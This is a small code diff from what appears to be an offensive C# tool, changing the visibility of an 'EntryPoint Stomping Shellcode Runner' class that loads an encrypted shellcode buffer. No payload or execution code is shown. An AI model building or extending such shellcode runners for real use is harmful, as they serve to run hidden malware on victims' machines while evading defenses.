@@ -10,7 +10,7 @@ namespace NetRunners.Runners
     /// <summary>
     /// This class contains the EntryPoint Stomping Shellcode Runner (Special Thanks 2 cpu0x00!)
     /// </summary>
-    class EpsRunner
+    public static class EpsRunner
     {
         static byte[] buf = Data.EncryptedData.buf;
         static int sBuf = Data.EncryptedData.sBuf;       // decrypted buf size
